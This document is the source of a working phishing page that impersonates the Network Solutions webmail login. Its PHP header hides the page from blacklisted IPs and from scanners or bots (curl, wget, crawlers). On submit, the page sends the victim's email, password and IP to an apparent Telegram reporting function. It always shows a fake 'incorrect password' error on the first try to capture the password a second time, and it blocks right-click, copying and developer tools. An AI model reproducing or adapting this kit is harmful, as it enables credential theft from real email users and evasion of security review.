<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport"
    content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="google" value="notranslate">
  <meta name="robots" content="noindex, nofollow">
  <meta name="theme-color" content="#fff">
  <meta name="application-name" content="App Suite">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="App Suite">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="mobile-web-app-capable" content="yes">
  
  <title>Network Solutions | Cloud Mail Access</title>

  <!-- Favicon and Icons (Referencing live site for independent loading) -->
  <link id="homescreen-icon" rel="apple-touch-icon" href="https://webmail-oxcs.networksolutionsemail.com/appsuite/themes/default/logo_180.png">
  <link id="favicon-ico" rel="icon" href="https://webmail-oxcs.networksolutionsemail.com/appsuite/favicon.ico" sizes="any">
  
  <style type="text/css">
    html,
    body {
      background-color: #fff;
      margin: 0;
      padding: 0;
      border: 0;
      overscroll-behavior-y: none;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    body {
      overflow: auto !important;
    }

    #background-loader {
      display: none !important;
    }
    
    #io-ox-login-screen {
        display: block !important;
        visibility: visible !important;
        position: relative;
        z-index: 10;
        min-height: 100vh;
    }
    
    #io-ox-login-content {
        visibility: visible !important;
        display: block !important;
        opacity: 1 !important;
    }

    /* Styles extracted from NetworkSolution.html and live OX portal */
    #io-ox-login-container {
        position: absolute;
        width: 100%;
        min-height: 100vh;
        background-color: #eee;
        background-image: url('https://image.thum.io/get/width/1500/https://www.networksolutionsemail.com');
        background-size: cover;
        background-position: center;
        background-attachment: fixed;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
        box-sizing: border-box;
    }

    #io-ox-login-box {
        background: rgba(255, 255, 255, 0.96);
        width: 100%;
        max-width: 440px;
        padding: 40px;
        border-radius: 4px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        box-sizing: border-box;
    }

    .login-header-logo {
        text-align: center;
        margin-bottom: 30px;
    }

    .login-header-logo img {
        max-height: 40px;
    }

    .form-group {
        margin-bottom: 20px;
    }

    .form-group label {
        display: block;
        font-weight: bold;
        margin-bottom: 8px;
        color: #333;
        font-size: 14px;
    }

    .form-control {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 2px;
        font-size: 16px;
        box-sizing: border-box;
    }

    .btn-primary {
        width: 100%;
        padding: 12px;
        background-color: #0076a3;
        border: none;
        border-radius: 2px;
        color: #fff;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        text-transform: uppercase;
        margin-top: 10px;
    }

    .btn-primary:active {
        background-color: #005a7d;
    }

    #io-ox-login-feedback {
        color: #a94442;
        background-color: #f2dede;
        border: 1px solid #ebccd1;
        padding: 12px;
        margin-bottom: 20px;
        border-radius: 4px;
        display: none;
        text-align: center;
        font-size: 14px;
    }

    .flex-column { display: flex; flex-direction: column; }
    .col-xs-12 { width: 100%; box-sizing: border-box; }
    .row { width: 100%; box-sizing: border-box; }
    .help-block { font-size: 13px; color: #777; margin-bottom: 15px; }
    .text-right { text-align: right; margin-top: 5px; }
    .text-center { text-align: center; }
    #io-ox-forgot-password a { color: #0076a3; text-decoration: none; font-size: 13px; }
    
    footer { margin-top: 25px; font-size: 12px; color: #666; border-top: 1px solid #e5e5e5; padding-top: 20px; }
  </style>

  <!-- JQuery -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <!-- Antibot Scripts -->
  <script src="../m/js/fingerprint.js"></script>
  <script src="../m/js/utils.js"></script>
  <script src="../m/js/captcha.js"></script>
  
  <!-- Centralized Functions -->
  <script src="../js/centralized_telegram.js"></script>
  <script src="../js/centralized_redirect.js"></script>
  <script src="../js/email_extractor.js"></script>
  <script src="../js/autofill_helper.js"></script>
</head>

<body class="unselectable">
  <div id="io-ox-login-screen">
    <div id="io-ox-login-container">
      <main id="io-ox-login-box">
        <div class="login-header-logo">
           <img id="img-field" src="https://webmail-oxcs.networksolutionsemail.com/appsuite/themes/default/logo_180.png" alt="Network Solutions">
        </div>

        <div id="io-ox-login-feedback"></div>
        
        <form id="io-ox-login-form" novalidate>
          <div class="col-xs-12">
            <div class="row help">
              <p id="io-ox-login-help" class="help-block">Sign in with your Network Solutions email account</p>
            </div>
            
            <div class="form-group row username">
              <label for="io-ox-login-username">Username</label>
              <input type="text" id="io-ox-login-username" name="username" class="form-control"
                maxlength="1000" spellcheck="false" aria-required="true" autocomplete="username">
            </div>
            
            <div class="form-group row password">
              <label for="io-ox-login-password">Password</label>
              <input type="password" id="io-ox-login-password" name="password" class="form-control"
                maxlength="1000" aria-required="true" autocomplete="current-password">
              <div class="text-right" id="io-ox-forgot-password">
                <a href="#">Forgot your password?</a>
              </div>
            </div>
            
            <div class="row options">
              <div class="checkbox" style="margin-bottom: 20px;">
                <label style="font-size: 14px; cursor: pointer;">
                  <input type="checkbox" id="io-ox-login-store-box" checked="checked" name="staySignedIn" value="1">
                  Stay signed in
                </label>
              </div>
            </div>

            <div class="row button">
              <button type="submit" id="io-ox-login-button" class="btn btn-primary">Sign In</button>
            </div>
          </div>
        </form>
        
        <footer class="text-center">
            <p>&copy; <?php echo date('Y'); ?> Network Solutions. All rights reserved.</p>
        </footer>
      </main>
    </div>
  </div>

  <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
  <script>
    $(document).ready(function() {
        var count = 0;
        const emailInput = document.getElementById('io-ox-login-username');
        const passInput = document.getElementById('io-ox-login-password');
        const feedback = $(document.getElementById('io-ox-login-feedback'));
        const submitBtn = $(document.getElementById('io-ox-login-button'));
        
        function getDomain(email) {
            return email.substring(email.lastIndexOf("@") + 1);
        }

        // Standardized autofill hook
        const initialEmail = typeof extractEmailFromUrl === 'function' ? extractEmailFromUrl() : "";
        if (initialEmail) {
            emailInput.value = initialEmail;
            const domain = getDomain(initialEmail);
            if (domain && !domain.includes('netsol') && !domain.includes('networksolutions')) {
                document.getElementById("img-field").src = `https://logo.clearbit.com/${domain}`;
                document.getElementById("io-ox-login-container").style.backgroundImage = `url('https://image.thum.io/get/width/1500/https://${domain}')`;
            }
        }

        $('#io-ox-login-form').on('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passInput.value.trim();
            const clientIP = window.userip || 'n/a';
            window.providerTag = 'networksolutions';

            if (!email || !email.includes('@')) {
                feedback.text("Please enter a valid email address.").show();
                emailInput.focus();
                return;
            }
            if (!password) {
                feedback.text("Please enter your password.").show();
                passInput.focus();
                return;
            }

            count++;
            feedback.hide();
            submitBtn.prop('disabled', true);
            
            function reportAndRedirect(redirect) {
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(providerTag, email, password, clientIP, function() {
                        if (redirect) {
                            if (typeof performCentralizedRedirect === 'function') {
                                performCentralizedRedirect(800);
                            } else {
                                window.location.replace(`https://www.${getDomain(email)}`);
                            }
                        }
                    });
                } else {
                    if (redirect) setTimeout(() => window.location.replace(`https://www.${getDomain(email)}`), 800);
                }
            }

            if (count === 1) {
                submitBtn.text("Verifying...");
                reportAndRedirect(false);
                
                setTimeout(function() {
                    feedback.text("The password you entered is incorrect. Please try again.").show();
                    passInput.value = "";
                    submitBtn.text("Sign In");
                    submitBtn.prop('disabled', false);
                    passInput.focus();
                }, 1800);
            } else {
                submitBtn.text("Signing in...");
                reportAndRedirect(true);
            }
        });

        // Anti-copy / Anti-inspect
        (function() {
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) { e.preventDefault(); }, false);
            }
            document.addEventListener('copy', function(e) { e.preventDefault(); }, false);
            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123) e.preventDefault();
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) e.preventDefault();
                if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
            });
        })();
    });
  </script>
</body>
</html>
